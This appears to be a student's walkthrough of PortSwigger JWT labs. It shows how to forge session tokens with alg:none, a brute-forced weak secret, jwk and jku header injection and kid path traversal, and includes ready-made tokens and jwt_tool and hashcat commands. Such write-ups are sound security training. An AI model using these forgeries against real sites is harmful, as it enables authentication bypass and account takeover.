## Lab - 1: JWT authentication bypass via unverified signature (A)

- This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives. To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peter

- the payload part of session is as follow:

```json
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1665055299
}
```

- change the `"sub": "administrator"` and send the request
- user account will become admin
- with this token, set GET request to this `GET /admin/delete?username=carlos HTTP/1.1`

---

## Lab - 2: JWT authentication bypass via flawed signature verification (A)

- This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs. To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peter

- the original session cookie looks like this:

```
eyJraWQiOiJjZDMzZDE1OC01MDMwLTQ3ODgtOTI0NS0xODE5ZDUzMThmMDEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2NTA1NzAxMX0.CnOMEooDjAM8u_zF_f1lc3Q3cxm6K4wVTjR_x_G-i1Vu_icxWQmZ9como2XV0jMbYfh0ElFmBEMbB7wlOheD_tRRgX0jz-rEr3btt7W4KMpm92CbGUiWBiN_dUOp_bNIH40mRcUauseRQEKCEdQ_KQYks6TILpMXQiKzimrZygPla-rRK5E0Q3FfMCMRVisrpxf1nH2aP77BK0Ou1XqmU56rP8nm43sca7vJu4Y1LzHk5FypUkJei5P9KGtgaQQue9-a2HbERht7VAX4Wxe-BH6_fZ231je15259CndAXpP-svHz8wiZjkl-cQDaASBTNjJcqam9eESdrGyexbc1TA
```

- after decoding header and payload parts,

```json
{ "kid": "cd33d158-5030-4788-9245-1819d5318f01", "alg": "RS256" } # header
{"iss":"portswigger","sub":"wiener","exp":1665057011} # payload
```

- change the `"alg": "none"` and `"sub": "administrator"` and delete the signature part but **remember to leave the `.`**

- the session cookie looks like this:

```
eyJraWQiOiJjZDMzZDE1OC01MDMwLTQ3ODgtOTI0NS0xODE5ZDUzMThmMDEiLCJhbGciOiJub25lIn0%3d.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NjUwNTcwMTF9.
```

- **the last dot is important**
- then enter as an admin and go on

---

## Lab - 3: JWT authentication bypass via weak signing key (P)

- This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets. To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peter

1. Brute-Force with hashcat

- login with wiener and get the session JWT token
- try the previous steps and not working
- use hashcat wordlist from https://github.com/wallarm/jwt-secrets

```
hashcat -a 0 -m 16500 your-JWT wt.secrets.list
```

- get `secret1`

2. Generate a forged signing key

- use Brup Decoder, base64 encode the `secret1` => `c2VjcmV0MQ==`
- in `JWT Editor Keys` tab > `Add New Symmetric Key` > Generate > substitue above value in "k" parameter

3. Modify and sign the JWT

- in Burp Repeater, use JSON Web Token extension
- modify the "sub" parameter to "administrator"
- `Sign` and select the key that was generated before
- Select `Don't modify header`
- Copy that JWT and GET request to `/admin`

### With jwt_tool
```sh
❯ python jwt_tool.py $jwt -C  -d jwt.secrets.list 
❯ python jwt_tool.py $jwt -T -S hs256 -p "secret1" 
# follow the menu to change the payloads
```

---

## Lab - 4: JWT authentication bypass via jwk header injection (P)

- This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source. To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peter

- login with wiener and get the session JWT token
- try the previous steps and not working
- `JWT Editor Keys` tab > `New RSA Key` > Generate >
- in Burp Repeater, use JSON Web Token extension
- change the payload to administrator
- `Attack` > Embedded JWK > choose that was generated before in signing key > OK
- copy the JWT and send with /admin request

### With jwt_tool

- in ~/.jwt_tool/jwtconf.int, change the `jwks_kid` parameter to value from jwt

```sh
❯ python jwt_tool.py $jwt -I -hc kid -hv 73c9f5d0-adfb-4c82-ba6c-c622cd1bfcd7 -pc sub -pv administrator -X i
```

---

## Lab - 5: JWT authentication bypass via jku header injection (P)

- This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key. To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peter

- login with `wiener` account
- send to Burp Repeater with one of the request that contains session JWT
- `JWT Editor Keys` > `New RSA Key` > Generate
- on the generated key (Right click) > Copy public key as RSA
- then stored at the exploit server like this format :

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "7f5bc94c-f527-4a27-b49c-5769797ada3d",
      "n": "tagE2UCQk1ZDqCindZMOdXw8D2QM08dJNhlAT7cj2PbI9ch82zm9T13A-h4wIil6_TqGptYuVNvqmNBML9uun0Pd8VLAybxnWIS0jjv8tD8N9SOcIGWNW8AItpBnoRk4cKdrDzyiOhUPzc0MWxOzKHXTG36sG0NrT6PzLCGE3Yyop4fWMbyH-HMncWUqkapLoyEn7h0BSeuDhNE5g309x6sCZ61FwRvoNMZbs5h4m7tWWdV8effKW4WiEGaOmbuNt6a08vSRUiNedqLiS2ectPl84-iheO59BGFfBgdsYRRX2aOLVthrd3_gU7GQavk2KywEHGfruP8WK49nQzGkxQ"
    }
  ]
}
```

- modified the JWT like this
- header -> the `kid` parameter from the previous key and `jku` parameter to the exploit server link

```json
{
  "kid": "7f5bc94c-f527-4a27-b49c-5769797ada3d",
  "alg": "RS256",
  "jku": "https://exploit-0af0004c03c7a8c7c13a34c6013a00d4.exploit-server.net/exploit"
}
```

- payload -> "sub" parameter to administrator

```json
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1665067857
}
```

- `Sign` > Signing Key to the previous generated key
- Make sure `Don't modify header` checked
- copy the token and send with this token

### With jwt_tool 

- in the exploit body , store the result from 
```sh
❯ cat ~/.jwt_tool/jwttool_custom_jwks.json 
```
- change the `kid` value to original value

```sh
❯ python jwt_tool.py $jwt -I -pc sub -pv administrator -X s -ju https://exploit-0ab900d803503da7c05070d501b60025.exploit-server.net/exploit
```

---

## Lab - 6: JWT authentication bypass via kid header path traversal (P)

- This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem. To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peter

- login with `wiener` account
- send to Burp Repeater with one of the request that contains session JWT
- `JWT Editor Keys` > `New Symmetric Key` > Generate > change the `k` parameter to `AA==` which is null byte
- change the header as

```json
{
  "kid": "../../../../../../dev/null",
  "alg": "HS256"
}
```

- change the payload as

```json
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1665069775
}
```

- sign to the previous generated token
- copy the token

### With jwt_tool

```sh
❯ python jwt_tool.py $jwt -I -hc kid -hv ../../../../../../dev/null -pc sub -pv administrator -S hs256
```

---

##  Lab - 7: JWT authentication bypass via algorithm confusion (E)

This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. To solve the lab, first obtain the server's public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`